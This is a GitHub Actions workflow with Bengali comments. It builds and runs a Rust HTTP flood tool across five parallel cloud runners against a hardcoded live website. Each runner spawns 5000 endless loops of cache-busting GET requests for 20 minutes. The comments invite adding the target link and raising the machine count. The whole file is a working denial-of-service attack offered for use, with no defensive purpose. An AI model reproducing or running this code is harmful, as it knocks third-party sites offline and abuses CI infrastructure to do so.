name: Vortex Matrix Cloud Engine
on: 
  workflow_dispatch: # তুমি ম্যানুয়ালি রান করবে

jobs:
  vortex-attack:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false # একটি মেশিন ফেইল করলে বাকিগুলো বন্ধ হবে না
      matrix:
        instance: [1, 2, 3, 4, 5] # এখানে ৫টি মেশিন সেট করা আছে। চাইলে সংখ্যা বাড়াতে পারো (১০ বা ১৫)

    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Auto-Build Rust Engine
        run: |
          cargo new vortex_matrix --bin
          cd vortex_matrix
          echo '[package]
          name = "vortex_matrix"
          version = "0.1.0"
          edition = "2021"
          [dependencies]
          tokio = { version = "1", features = ["full"] }
          reqwest = { version = "0.11", features = ["rustls-tls"] }
          rand = "0.8"' > Cargo.toml
          
          echo 'use reqwest::Client;
          use std::time::Duration;
          use rand::Rng;
          #[tokio::main]
          async fn main() {
              let target = "https://www.ninjahex.com/"; // জিহাদ, এখানে লিংক দাও
              let client = Client::builder()
                  .danger_accept_invalid_certs(true)
                  .build().unwrap();
              println!("🚀 Instance No: ${{ matrix.instance }} is Firing!");
              
              let mut handles = vec![];
              for _ in 0..5000 {
                  let client_ref = client.clone();
                  let target_ref = target.to_string();
                  handles.push(tokio::spawn(async move {
                      let mut rng = rand::thread_rng();
                      loop {
                          let random_id: u64 = rng.gen();
                          let url = format!("{}?vortex={}", target_ref, random_id);
                          let _ = client_ref.get(&url).send().await;
                      }
                  }));
              }
              // ২০ মিনিট পর অটোমেটিক বন্ধ হওয়ার জন্য সেফটি টাইমার
              tokio::time::sleep(Duration::from_secs(1200)).await;
              println!("🛑 Timer complete. Shutting down.");
          }' > src/main.rs

      - name: Execute High-Speed Load
        run: |
          cd vortex_matrix
          cargo run --release
